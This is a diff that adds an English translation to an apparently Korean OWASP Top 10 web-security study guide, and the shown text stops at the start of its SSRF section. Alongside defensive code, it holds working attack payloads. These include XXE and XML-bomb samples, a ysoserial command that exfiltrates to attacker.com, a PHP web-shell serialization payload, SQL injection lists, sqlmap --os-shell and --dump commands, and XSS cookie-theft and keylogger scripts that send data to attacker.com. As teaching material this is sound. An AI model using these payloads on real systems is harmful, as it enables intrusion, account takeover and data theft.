@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # OWASP Top 10 — 웹 취약점 완전 정복
 
 ## OWASP 자동화 위협 분류 (Automated Threat Handbook)
@@ -1323,5 +1329,1337 @@ token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
 decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # 알고리즘 고정
 
 # 로그아웃 시 토큰 블랙리스트 처리
+redis_client.setex(f"blacklist:{jti}", 3600, "revoked")
+```
+
+---
+
+<a name="english"></a>
+
+# OWASP Top 10 — Complete Guide to Web Vulnerabilities
+
+## OWASP Automated Threat Classification (Automated Threat Handbook)
+
+OWASP classifies automated threats against web applications into 21 OAT (Ontology of Automated Threats) categories.
+
+```
+Automated Threat List (key entries):
+OAT-001 Carding          — Bulk validation of card numbers
+OAT-002 Token Cracking   — Brute-force of authentication tokens
+OAT-003 Ad Fraud         — Automated ad click fraud
+OAT-004 Fingerprinting   — Collecting software fingerprints
+OAT-005 Scalping         — Automated purchase of limited goods
+OAT-006 Expediting       — Manipulating transaction processing speed
+OAT-007 Credential Cracking — Brute-force of account credentials
+OAT-008 Credential Stuffing — Login attempts using leaked credential lists
+OAT-009 CAPTCHA Defeat   — Automated CAPTCHA solving
+OAT-010 Card Cracking    — Brute-force of card CVV/expiration dates
+OAT-011 Scraping         — Automated content collection
+OAT-012 Cashing Out      — Monetizing stolen payment methods
+OAT-013 Sniping          — Automated last-second auction bidding
+OAT-014 Vulnerability Scanning — Automated vulnerability scanning
+OAT-015 Denial of Service — Service disruption
+OAT-016 Skewing          — Manipulating statistics/ratings
+OAT-017 Spamming         — Automated spam content generation
+OAT-018 Footprinting     — Automated mapping of app structure
+OAT-019 Account Creation — Mass creation of fake accounts
+OAT-020 Account Aggregation — Consolidating data from multiple accounts
+OAT-021 Denial of Inventory — Blocking purchases by hoarding inventory (new in v1.2)
+```
+
+### Automated Threat Defense Strategy
+
+A multi-layered defense strategy against automated threats (bot attacks). Limit request frequency with Rate Limiting, combine CAPTCHA with device fingerprinting, and block known bot IPs using bot management solutions (Cloudflare, AWS WAF).
+
+```
+Detection Layer:
+  - Behavioral analysis (request frequency, patterns)
+  - Device fingerprinting
+  - JavaScript challenges
+  - CAPTCHA (note: can be bypassed via OAT-009)
+
+Defense Layer:
+  - Rate Limiting (per IP/user/endpoint)
+  - CAPTCHA (advanced — reCAPTCHA v3, hCaptcha)
+  - Bot management solutions (Cloudflare Bot Management, AWS WAF)
+  - Behavior-based detection (mouse movements, click patterns)
+  - IP reputation database integration
+```
+
+---
+
+## OWASP Top 10 (2021) Overview
+
+| Rank | Vulnerability | Risk Level |
+|------|---------------|------------|
+| A01 | Broken Access Control | Very High |
+| A02 | Cryptographic Failures | High |
+| A03 | Injection | High |
+| A04 | Insecure Design | High |
+| A05 | Security Misconfiguration | High |
+| A06 | Vulnerable and Outdated Components | Medium |
+| A07 | Identification and Authentication Failures | High |
+| A08 | Software and Data Integrity Failures | High |
+| A09 | Security Logging and Monitoring Failures | Medium |
+| A10 | Server-Side Request Forgery (SSRF) | Medium |
+
+---
+
+## OWASP Top 10 (2017) — Previous Version Comparison
+
+| Rank | Vulnerability | Risk Score |
+|------|---------------|------------|
+| A1:2017 | Injection | 8.0 |
+| A2:2017 | Broken Authentication | 7.0 |
+| A3:2017 | Sensitive Data Exposure | 7.0 |
+| A4:2017 | XML External Entities (XXE) | 7.0 |
+| A5:2017 | Broken Access Control | 6.0 |
+| A6:2017 | Security Misconfiguration | 6.0 |
+| A7:2017 | Cross-Site Scripting (XSS) | 6.0 |
+| A8:2017 | Insecure Deserialization | 5.0 |
+| A9:2017 | Using Components with Known Vulnerabilities | 4.7 |
+| A10:2017 | Insufficient Logging & Monitoring | 4.0 |
+
+### Key Changes from 2013 to 2017
+```
+Newly added:
+  A4:2017 - XML External Entities (XXE) — based on SAST tool data
+  A8:2017 - Insecure Deserialization    — community vote
+  A10:2017 - Insufficient Logging & Monitoring — community vote
+
+Merged:
+  A4(IDOR) + A7(Function Level Access Control) → A5:2017 Broken Access Control
+
+Removed:
+  A8-CSRF (found in only 5% of apps; most frameworks protect against it)
+  A10-Unvalidated Redirects and Forwards (displaced by XXE)
+```
+
+### OWASP Risk Scoring Method
+```
+Risk Score = (Exploitability + Detectability) / 2 × Technical Impact
+
+Example: A6 Security Misconfiguration
+  Exploitability: 3 (easy)
+  Prevalence:     3 (widespread)
+  Detectability:  3 (easy)
+  Technical Impact: 2 (moderate)
+  → Average 3.0 × 2 = 6.0
+```
+
+---
+
+## A3:2017 Sensitive Data Exposure
+
+### Key Attack Scenarios
+```
+1. Plaintext HTTP transmission
+   Login form sent over HTTP → credentials stolen via man-in-the-middle attack
+
+2. Weak cryptographic algorithms
+   Passwords hashed with MD5/SHA-1 → recoverable via rainbow table attacks
+
+3. Unencrypted data storage
+   Credit card numbers, social security numbers stored in plaintext in the DB
+
+4. Unnecessary data collection/retention
+   GDPR/PCI DSS violation: storing more personal data than needed
+```
+
+### Secure Password Hashing Algorithms
+
+Implements secure password hashing algorithms such as bcrypt and Argon2 in Python. Always use one-way password hashes instead of generic hashes like MD5/SHA.
+
+```python
+#!/usr/bin/env python3
+"""
+Password hashing algorithm comparison and verification tool
+Usage: python3 pw_hash.py --hash argon2 --password "MyP@ss123"
+"""
+import argparse
+import hashlib
+import os
+import time
+from typing import Callable
+
+
+# ── Bad methods (never use) ──────────────────────────────────────────────────
+def bad_md5(password: str) -> str:
+    return hashlib.md5(password.encode()).hexdigest()  # instantly reversible via rainbow tables
+
+
+def bad_sha256_no_salt(password: str) -> str:
+    return hashlib.sha256(password.encode()).hexdigest()  # vulnerable to dictionary attacks without salt
+
+
+# ── Good methods ──────────────────────────────────────────────────────────────
+def good_argon2(password: str) -> str:
+    """Argon2id — 2015 PHC winner, recommended by NIST SP 800-63B"""
+    from argon2 import PasswordHasher, Type
+    ph = PasswordHasher(
+        time_cost=3,           # iterations (minimum 3)
+        memory_cost=65536,     # 64MB memory
+        parallelism=2,         # parallelism 2
+        hash_len=32,
+        type=Type.ID,          # Argon2id (side-channel resistant)
+    )
+    return ph.hash(password)
+
+
+def good_bcrypt(password: str) -> bytes:
+    """bcrypt — cost factor 12 or higher recommended"""
+    import bcrypt
+    salt = bcrypt.gensalt(rounds=12)
+    return bcrypt.hashpw(password.encode("utf-8"), salt)
+
+
+def good_pbkdf2(password: str) -> str:
+    """PBKDF2-HMAC-SHA256 — Python built-in, NIST approved"""
+    salt = os.urandom(32)
+    key = hashlib.pbkdf2_hmac(
+        "sha256",
+        password.encode("utf-8"),
+        salt,
+        iterations=600_000,    # OWASP 2023 recommendation: 600,000 iterations
+    )
+    return salt.hex() + ":" + key.hex()
+
+
+def good_scrypt(password: str) -> str:
+    """scrypt — memory-intensive, resistant to GPU attacks"""
+    salt = os.urandom(32)
+    key = hashlib.scrypt(
+        password.encode("utf-8"),
+        salt=salt,
+        n=2**17,    # memory parameter (minimum 2^14)
+        r=8,
+        p=1,
+        dklen=32,
+    )
+    return salt.hex() + ":" + key.hex()
+
+
+def benchmark(name: str, fn: Callable, password: str) -> None:
+    start = time.perf_counter()
+    result = fn(password)
+    elapsed = time.perf_counter() - start
+    truncated = str(result)[:40] + "..."
+    print(f"  [{name:<20}] {elapsed*1000:6.1f}ms  → {truncated}")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Password hashing comparison tool")
+    parser.add_argument("--password", default="P@ssw0rd!2024",
+                        help="Password to test")
+    parser.add_argument("--benchmark", action="store_true",
+                        help="Run speed benchmark")
+    args = parser.parse_args()
+
+    pw = args.password
+    print(f"[*] Password: {pw}\n")
+    print("[Bad examples (attack targets)]")
+    benchmark("MD5 (dangerous)", bad_md5, pw)
+    benchmark("SHA256 no-salt (dangerous)", bad_sha256_no_salt, pw)
+
+    print("\n[Recommended algorithms]")
+    benchmark("Argon2id", good_argon2, pw)
+    benchmark("bcrypt (cost=12)", good_bcrypt, pw)
+    benchmark("PBKDF2 (600k)", good_pbkdf2, pw)
+    benchmark("scrypt (n=2^17)", good_scrypt, pw)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### TLS Configuration Audit
+
+Audits TLS versions and cipher suites. Verifies that TLS 1.0/1.1 and weak encryption algorithms (RC4, DES) are disabled.
+
+```bash
+# Audit TLS versions and cipher suites
+nmap --script ssl-enum-ciphers -p 443 target.com
+
+# SSL Labs test (aiming for A+ rating)
+# https://www.ssllabs.com/ssltest/
+
+# Disable insecure protocols (nginx example)
+ssl_protocols TLSv1.2 TLSv1.3;  # disable TLS 1.0, 1.1
+ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
+ssl_prefer_server_ciphers off;
+
+# HSTS (HTTP Strict Transport Security)
+add_header Strict-Transport-Security "max-age=63072000" always;
+```
+
+---
+
+## A4:2017 XXE (XML External Entities)
+
+### XXE Attack Principle
+
+The XXE (XML External Entity) vulnerability occurs when an XML parser processes external entities. It can be exploited to read files using `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>` or to conduct SSRF attacks. Defend by disabling external entity processing.
+
+```xml
+<!-- Normal XML -->
+<user><name>admin</name></user>
+
+<!-- XXE attack: read file via external entity declaration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user><name>&xxe;</name></user>
+<!-- Server inserts /etc/passwd content into the name field and responds -->
+```
+
+### Billion Laughs (DoS Attack)
+
+The XML Billion Laughs attack (XML bomb) uses nested entity references to exponentially exhaust memory and cause a DoS condition.
+
+```xml
+<!-- XML bomb — memory exhaustion DoS -->
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<lolz>&lol5;</lolz>
+<!-- lol5 = 10^5 = 100,000 "lol" strings → hundreds of MB of memory usage -->
+```
+
+### SAML XXE (Authentication Bypass)
+
+The XXE vulnerability occurs when an XML parser processes external entities. It can be used to read files or conduct SSRF attacks. Defend by disabling external entity processing.
+
+```
+Decode SAML Response (Base64-encoded XML) and inject XXE
+→ XXE executes during SSO authentication
+→ Read internal files or conduct SSRF
+
+Attack flow:
+1. Capture a legitimate SAML response (Burp Suite)
+2. Base64 decode it
+3. Inject XXE payload
+4. Re-encode with Base64
+5. Send the tampered SAML response
+```
+
+### XXE Defense
+
+The XXE vulnerability occurs when an XML parser processes external entities. Defend by disabling external entity processing entirely.
+
+```java
+// Java: DocumentBuilderFactory configuration (disable XXE)
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+
+// Python lxml
+from lxml import etree
+parser = etree.XMLParser(resolve_entities=False, no_network=True)
+
+// Best defense: use JSON instead of XML
+// If you must use an XML parser, fully disable DTD processing
+```
+
+---
+
+## A8:2017 Insecure Deserialization
+
+### Deserialization Attack Principle
+```
+Serialization:   object → byte stream (for storage/transmission)
+Deserialization: byte stream → object (restoration)
+
+Attack: send tampered serialized data to the server
+        → arbitrary code execution (RCE) during deserialization
+```
+
+### Java Deserialization Attack
+
+A vulnerable Java code pattern. Deserializing untrusted input via ObjectInputStream can result in arbitrary code execution.
+
+```java
+// Vulnerable code: deserializing untrusted input
+ObjectInputStream ois = new ObjectInputStream(inputStream);
+Object obj = ois.readObject();  // dangerous!
+
+// Generate malicious serialized data (ysoserial tool)
+// java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser
+// → executes calc.exe upon deserialization
+```
+
+Generates Java deserialization RCE payloads using the ysoserial tool. Exploits vulnerable gadget chains such as Commons Collections.
+
+```bash
+# Generate RCE payload with ysoserial
+java -jar ysoserial.jar CommonsCollections4 "curl attacker.com/`whoami`" | base64
+
+# Send to vulnerable Java app
+curl -X POST http://target.com/api/object \
+  -H "Content-Type: application/x-java-serialized-object" \
+  --data-binary @payload.ser
+```
+
+### PHP Deserialization Attack
+
+PHP unserialize() vulnerability. Arbitrary code can be executed via object injection using magic methods (__destruct, __wakeup).
+
+```php
+// Vulnerable code
+$data = unserialize($_COOKIE['user_data']);  // dangerous!
+
+// Attack: abuse __wakeup()/__destruct() magic methods
+class Logger {
+    public $filename;
+    public $data;
+    
+    function __destruct() {
+        file_put_contents($this->filename, $this->data);
+    }
+}
+
+// Serialize malicious object
+$obj = new Logger();
+$obj->filename = '/var/www/html/shell.php';
+$obj->data = '<?php system($_GET["cmd"]); ?>';
+echo serialize($obj);
+// → O:6:"Logger":2:{s:8:"filename";s:30:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
+```
+
+### Defense Methods
+```
+1. Never deserialize serialized data from untrusted sources
+2. Verify serialized data integrity using digital signatures
+   - HMAC signature: sign with a server-only secret key → detect tampering
+3. Java: use safe deserialization libraries
+   - SerialKiller: whitelist-based class filter
+   - NotSoSerial: agent-based protection
+4. Use text formats like JSON/XML where possible
+5. Run deserialization operations in a minimal-privilege sandbox
+```
+
+---
+
+## A10:2017 Insufficient Logging & Monitoring
+
+### Real-World Statistics
+```
+- Average breach detection time: 200 days (IBM Security Report)
+- Breaches discovered by external parties: approximately 2/3 (internal detection failure)
+- Ransomware: dwells inside for an average of 80 days before triggering
+```
+
+### Events That Must Be Logged
+```
+Authentication:
+  - Login success/failure (IP, timestamp, username)
+  - Password reset attempts
+  - Account lockouts
+  - Session creation/termination
+
+Access Control:
+  - Unauthorized resource access attempts
+  - Admin function access
+  - Bulk data downloads
+
+Input Validation:
+  - SQL Injection attempt patterns
+  - XSS payload detection
+  - File path traversal attempts
+```
+
+### SIEM-Integrated Logging Implementation
+
+A logging implementation for sending security events to a SIEM system. Structured log formats facilitate attack detection and incident response.
+
+```python
+#!/usr/bin/env python3
+"""
+Structured security event logger — JSON format, ELK/SIEM integration support
+Usage: python3 sec_logger.py (import as module)
+"""
+import json
+import logging
+import logging.handlers
+import os
+import sys
+from datetime import datetime, timezone
+from dataclasses import dataclass, field, asdict
+from typing import Any
+
+
+# ── Event type constants ──────────────────────────────────────────────────────
+class EventType:
+    AUTH_SUCCESS     = "AUTH_SUCCESS"
+    AUTH_FAILURE     = "AUTH_FAILURE"
+    ACCOUNT_LOCKED   = "ACCOUNT_LOCKED"
+    PRIVESC_ATTEMPT  = "PRIVESC_ATTEMPT"
+    SQL_INJECTION    = "SQL_INJECTION"
+    XSS_ATTEMPT      = "XSS_ATTEMPT"
+    PATH_TRAVERSAL   = "PATH_TRAVERSAL"
+    BRUTE_FORCE      = "BRUTE_FORCE"
+    MASS_DOWNLOAD    = "MASS_DOWNLOAD"
+    ADMIN_ACCESS     = "ADMIN_ACCESS"
+
+
+@dataclass
+class SecurityEvent:
+    event_type: str
+    severity: str                          # CRITICAL / HIGH / MEDIUM / LOW / INFO
+    user: str = "anonymous"
+    source_ip: str = "0.0.0.0"
+    endpoint: str = ""
+    details: dict[str, Any] = field(default_factory=dict)
+    timestamp: str = field(
+        default_factory=lambda: datetime.now(timezone.utc).isoformat()
+    )
+    host: str = field(default_factory=lambda: os.uname().nodename)
+
+    def to_json(self) -> str:
+        return json.dumps(asdict(self), ensure_ascii=False)
+
+
+class SecurityLogger:
+    """Structured security logger (simultaneous file + console output, auto-rotation)"""
+
+    def __init__(
+        self,
+        log_file: str = "/var/log/security.json",
+        max_bytes: int = 50 * 1024 * 1024,  # 50MB
+        backup_count: int = 10,
+    ) -> None:
+        self._logger = logging.getLogger("security")
+        self._logger.setLevel(logging.DEBUG)
+        self._logger.propagate = False
+
+        # File handler (with rotation)
+        try:
+            fh = logging.handlers.RotatingFileHandler(
+                log_file, maxBytes=max_bytes, backupCount=backup_count
+            )
+            fh.setFormatter(logging.Formatter("%(message)s"))
+            self._logger.addHandler(fh)
+        except PermissionError:
+            pass  # skip file handler if no permission
+
+        # Console handler
+        ch = logging.StreamHandler(sys.stdout)
+        ch.setFormatter(logging.Formatter("%(message)s"))
+        self._logger.addHandler(ch)
+
+        # Threshold-based alerting (brute-force detection)
+        self._fail_counter: dict[str, int] = {}
+
+    def log(self, event: SecurityEvent) -> None:
+        level_map = {
+            "CRITICAL": logging.CRITICAL,
+            "HIGH":     logging.ERROR,
+            "MEDIUM":   logging.WARNING,
+            "LOW":      logging.INFO,
+            "INFO":     logging.INFO,
+        }
+        level = level_map.get(event.severity, logging.INFO)
+        self._logger.log(level, event.to_json())
+        self._check_brute_force(event)
+
+    def _check_brute_force(self, event: SecurityEvent) -> None:
+        if event.event_type != EventType.AUTH_FAILURE:
+            return
+        key = f"{event.source_ip}:{event.user}"
+        self._fail_counter[key] = self._fail_counter.get(key, 0) + 1
+        if self._fail_counter[key] >= 5:
+            alert = SecurityEvent(
+                event_type=EventType.BRUTE_FORCE,
+                severity="HIGH",
+                user=event.user,
+                source_ip=event.source_ip,
+                details={"fail_count": self._fail_counter[key]},
+            )
+            self._logger.error(alert.to_json())
+
+
+# Singleton instance
+_logger_instance: SecurityLogger | None = None
+
+
+def get_logger() -> SecurityLogger:
+    global _logger_instance
+    if _logger_instance is None:
+        _logger_instance = SecurityLogger()
+    return _logger_instance
+
+
+# ── Usage examples ────────────────────────────────────────────────────────────
+if __name__ == "__main__":
+    logger = get_logger()
+
+    # 5 auth failures → brute-force alert automatically triggered
+    for i in range(6):
+        logger.log(SecurityEvent(
+            event_type=EventType.AUTH_FAILURE,
+            severity="MEDIUM",
+            user="admin",
+            source_ip="192.168.1.100",
+            endpoint="/api/login",
+            details={"attempt": i + 1, "reason": "invalid_password"},
+        ))
+
+    # SQL Injection detection
+    logger.log(SecurityEvent(
+        event_type=EventType.SQL_INJECTION,
+        severity="CRITICAL",
+        user="anonymous",
+        source_ip="10.0.0.1",
+        endpoint="/api/users",
+        details={"payload": "' OR 1=1--", "param": "id"},
+    ))
+
+    # Admin access success log
+    logger.log(SecurityEvent(
+        event_type=EventType.ADMIN_ACCESS,
+        severity="HIGH",
+        user="admin",
+        source_ip="203.0.113.1",
+        endpoint="/admin/dashboard",
+        details={"method": "GET", "user_agent": "curl/8.2"},
+    ))
+```
+
+### 1-10-60 Detection Rule (CrowdStrike Standard)
+```
+Within 1 minute:  detect the breach
+Within 10 minutes: investigate the breach
+Within 60 minutes: isolate and block
+
+Real-world averages:
+  Detection:    tens to hundreds of days
+  Investigation: several days
+  Response:     days to weeks
+```
+
+---
+
+## OWASP Top 10 Risk Assessment Methodology (Official OWASP Documentation)
+
+```
+Risk score formula:
+  Risk Score = Likelihood × Impact
+
+Likelihood components:
+  - Exploitability: Easy(3) / Moderate(2) / Difficult(1)
+  - Prevalence:     Widespread(3) / Common(2) / Uncommon(1)
+  - Detectability:  Easy(3) / Moderate(2) / Difficult(1)
+
+Technical Impact:
+  - Severe(3) / Moderate(2) / Minor(1)
+
+OWASP benchmark data:
+  - Based on data from 40+ security companies
+  - Analysis of 100,000+ real-world applications/APIs
+  - Survey results from 500+ industry experts
+
+CWE mapping:
+  OWASP Top 10 entries are mapped to CWE (Common Weakness Enumeration)
+  → Provides a consistent vulnerability naming framework
+```
+
+### Applying OWASP Risk Assessment in Practice
+```
+Organization-specific risk assessment:
+  1. Identify threat actors (insiders/external hackers/nation-state actors)
+  2. Calculate technical impact × business impact
+  3. Consider compliance requirements (PCI DSS, GDPR, etc.)
+  4. Reflect industry-specific characteristics (healthcare/finance/public sector)
+
+ASVS (Application Security Verification Standard):
+  - OWASP detailed verification standard (Level 1~3)
+  - Level 1: items verifiable by automated testing
+  - Level 2: general security requirements
+  - Level 3: high-security environments (banking, healthcare)
+```
+
+---
+
+## A03: SQL Injection (Most Critical)
+
+### Principle
+```
+Normal query:
+SELECT * FROM users WHERE id='admin' AND pw='password'
+
+Attack (admin' --)
+SELECT * FROM users WHERE id='admin' --' AND pw='...'
+                                      ↑ comment neutralizes the rest → password bypass
+```
+
+### Basic SQL Injection Payloads
+
+SQL injection attacks the database by inserting user input directly into SQL queries to alter the query structure. `sqlmap` automates this process from DB type detection to data dumping in a single step.
+
+```sql
+-- Authentication bypass
+' OR '1'='1
+' OR 1=1--
+admin'--
+' OR 'a'='a
+
+-- Error-based (data extraction)
+' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
+
+-- UNION-based (confirm column count)
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 5--  ← error means column count = 4
+
+-- Data extraction via UNION
+' UNION SELECT NULL, NULL, NULL--           (match column count)
+' UNION SELECT 1, 'text', NULL--
+' UNION SELECT 1, table_name, NULL FROM information_schema.tables--
+' UNION SELECT 1, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1, username, password FROM users--
+```
+
+### Blind SQL Injection
+
+SQL injection manipulates query structure when user input is inserted directly into SQL queries. `sqlmap` automates this from DB detection to data dumping.
+
+```sql
+-- Boolean-based (extract data via true/false)
+-- true condition → normal page, false → different result
+
+' AND 1=1--          ← normal (true)
+' AND 1=2--          ← abnormal (false)
+
+-- Check if first character is 'a'
+' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)='a'--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1))>97--
+
+-- Time-based (extract via response time)
+' AND SLEEP(5)--            (MySQL)
+' WAITFOR DELAY '0:0:5'--   (MSSQL)
+'; SELECT pg_sleep(5)--     (PostgreSQL)
+
+-- Conditional time delay
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')=1, SLEEP(5), 0)--
+```
+
+### SQLMap Automation
+
+Automatically detect and exploit SQL injection vulnerabilities with SQLMap. Use --dbs, --tables, and --dump options to extract database contents.
+
+```bash
+# Basic usage
+sqlmap -u "http://target.com/page.php?id=1"
+
+# POST parameters
+sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"
+
+# Cookie authentication
+sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"
+
+# Database enumeration
+sqlmap -u "http://target.com/?id=1" --dbs          # list databases
+sqlmap -u "http://target.com/?id=1" -D mydb --tables  # list tables
+sqlmap -u "http://target.com/?id=1" -D mydb -T users --columns  # columns
+sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump     # dump data
+
+# Attempt OS shell
+sqlmap -u "http://target.com/?id=1" --os-shell
+
+# File read (requires MySQL FILE privilege)
+sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"
+
+# Speed and stealth options
+sqlmap -u "http://target.com/?id=1" --level=5 --risk=3 --delay=1
+sqlmap -u "http://target.com/?id=1" --random-agent  # randomize User-Agent
+```
+
+### SQL Injection Defense
+
+SQL injection attacks the database by inserting user input directly into SQL queries. Use prepared statements as the primary defense.
+
+```php
+// PDO Prepared Statement (most secure)
+$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ? AND pw = ?');
+$stmt->execute([$id, $pw]);
+
+// MySQLi Prepared Statement
+$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();
+
+// Input validation (additional defense)
+$id = filter_input(INPUT_GET, 'id', FILTER_SANITIZE_STRING);
+$id = intval($id);  // allow only integers
+```
+
+---
+
+## A03: XSS (Cross-Site Scripting)
+
+### XSS Types
+
+#### 1. Reflected XSS
+
+XSS (Cross-Site Scripting) is an attack that injects malicious scripts into web pages to execute in the victim's browser. It is categorized as reflected, stored, or DOM-based, and is used for session cookie theft or keylogger injection.
+
+```
+Attacker delivers a malicious link to the victim
+Victim clicks → server reflects the input directly → executes in the browser
+
+URL: http://target.com/search?q=<script>alert('XSS')</script>
+
+Server response:
+<div>Search results: <script>alert('XSS')</script></div>
+```
+
+#### 2. Stored XSS (more dangerous)
+
+XSS injects malicious scripts into web pages to execute in the victim's browser. It is categorized as reflected, stored, or DOM-based.
+
+```
+Attacker stores malicious script in the DB
+Automatically executes when other users visit the page
+
+Example: bulletin board post
+Content: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+```
+
+#### 3. DOM-based XSS
+
+DOM-based XSS is processed entirely by JavaScript without a server response. It can only be detected with developer tools (leaves no server logs).
+
+```
+XSS processed entirely by JavaScript without a server response
+Only detectable with developer tools (no server log entries)
+
+Vulnerable code:
+document.getElementById('output').innerHTML = location.hash.slice(1);
+
+Attack: http://target.com/page.html#<img src=x onerror=alert(1)>
+```
+
+### XSS Payload Collection
+
+XSS injects malicious scripts into web pages to execute in the victim's browser. Various payload techniques bypass filters.
+
+```javascript
+// Basic test
+<script>alert('XSS')</script>
+
+// Filter bypass (case variation)
+<SCRIPT>alert('XSS')</SCRIPT>
+<ScRiPt>alert('XSS')</ScRiPt>
+
+// Event handlers
+<img src=x onerror=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<svg onload=alert('XSS')>
+
+// JavaScript protocol
+<a href="javascript:alert('XSS')">click</a>
+
+// Without script tags
+<iframe src="javascript:alert('XSS')"></iframe>
+
+// Cookie theft
+<script>
+  document.location='http://attacker.com/steal.php?c='+document.cookie;
+</script>
+
+// Keylogger
+<script>
+  document.onkeypress = function(e) {
+    new Image().src = 'http://attacker.com/log?k=' + e.key;
+  };
+</script>
+
+// Filter bypass (encoding)
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>  // base64
+```
+
+### XSS Defense
+
+XSS injects malicious scripts into web pages. Use output encoding as the primary defense.
+
+```php
+// PHP: HTML entity encoding on output
+echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
+echo htmlentities($user_input, ENT_QUOTES, 'UTF-8');
+
+// When inserting into JavaScript context
+echo json_encode($user_input);
+```
+
+Safe code for DOM manipulation in JavaScript. Use textContent or createElement instead of innerHTML to prevent script injection.
+
+```javascript
+// JavaScript DOM manipulation
+element.textContent = userInput;    // safe (does not interpret HTML)
+// Dangerous:
+element.innerHTML = userInput;      // XSS possible!
+```
+```
+// CSP (Content Security Policy) header
+Content-Security-Policy: script-src 'self'; object-src 'none';
+```
+
+---
+
+## A01: Broken Access Control
+
+### IDOR (Insecure Direct Object Reference)
+```
+Vulnerable example:
+https://target.com/api/user/1234/profile  ← my profile
+https://target.com/api/user/1235/profile  ← another user's profile (accessible directly!)
+
+Attack:
+1. Change ID from 1234 to 1235 (sequential enumeration)
+2. Try other users' UUIDs even if UUIDs are used
+
+Defense:
+- Server compares the session's user ID with the resource owner
+- Use indirect reference maps (do not expose internal IDs externally)
+```
+
+### File Path Traversal
+```
+Attack examples:
+https://target.com/file?name=../../../etc/passwd
+https://target.com/file?name=....//....//etc/passwd (encoding bypass)
+https://target.com/file?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL encoding)
+
+Windows:
+https://target.com/file?name=..\..\..\..\windows\system32\drivers\etc\hosts
+
+Defense:
+$filename = basename($filename);  // strip path
+$safe_path = realpath('/uploads/' . $filename);
+if (!str_starts_with($safe_path, '/uploads/')) { die('Invalid'); }
+```
+
+---
+
+## A07: Authentication Failures
+
+### Session Hijacking
+```
+Methods to steal session cookies:
+1. Steal document.cookie via XSS
+2. Network sniffing (plaintext HTTP transmission)
+3. Browser history/cache
+
+Defense:
+Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
+- HttpOnly: not accessible from JavaScript (XSS defense)
+- Secure: transmit only over HTTPS
+- SameSite: CSRF defense
+```
+
+### Password Reset Vulnerabilities
+```
+Common vulnerabilities:
+1. Predictable tokens (timestamps, sequential numbers)
+2. No token expiration
+3. Reset possible with token alone, no email required
+4. Account enumeration (different responses for valid email)
+
+Defense:
+- Cryptographically secure random tokens (os.urandom(32))
+- Short expiration time (15 minutes)
+- Single-use tokens
+```
+
+---
+
+## A05: Security Misconfiguration
+
+### Dangers of Default Settings
+
+A list of default credentials (admin/admin, admin/password, etc.) for devices and services. These are security vulnerabilities that must be changed before deployment.
+
+```bash
+# Common default credentials
+admin:admin
+admin:password
+root:root
+admin:123456
+
+# Check for vulnerable server configurations
+# Apache directory listing
+curl http://target.com/uploads/  # file listing exposed?
+
+# Sensitive information in error messages
+curl http://target.com/page?id=abc
+# → MySQL error: You have an error in your SQL syntax...
+#   → DB type and query structure exposed!
+
+# Debug mode enabled
+curl http://target.com/
+# → X-Powered-By: PHP/7.4.1
+# → Server: Apache/2.4.49
+# → Version info enables attacks on known vulnerabilities
+```
+
+### Firewall/Network Configuration
+```bash
+# Check for unnecessary open ports
+nmap -sV --script=banner target.com
+
+# Check for exposed management interfaces
+nmap -p 8080,8443,9090,9200,27017 target.com
+# 8080: Tomcat admin
+# 9200: Elasticsearch (no authentication!)
+# 27017: MongoDB (no authentication!)
+
+# Attempt admin panel access with default credentials
+curl http://target.com:9200/_cat/indices  # Elasticsearch DB list
+curl http://target.com:27017/            # MongoDB
+```
+
+---
+
+## A10: SSRF (Server-Side Request Forgery)
+
+### SSRF Principle
+
